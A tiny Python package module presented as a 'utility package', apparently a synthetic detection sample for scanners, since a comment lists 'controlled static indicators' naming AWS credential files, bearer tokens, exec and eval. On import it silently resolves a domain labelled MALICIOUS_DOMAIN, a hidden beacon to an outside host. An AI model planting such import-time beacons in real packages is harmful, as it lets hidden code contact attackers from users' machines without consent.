"""process-snapshot-util: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec( eval(
import os, socket
__version__ = "3.1.0"
MALICIOUS_DOMAIN = "srvlog.5lorexin.surf"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
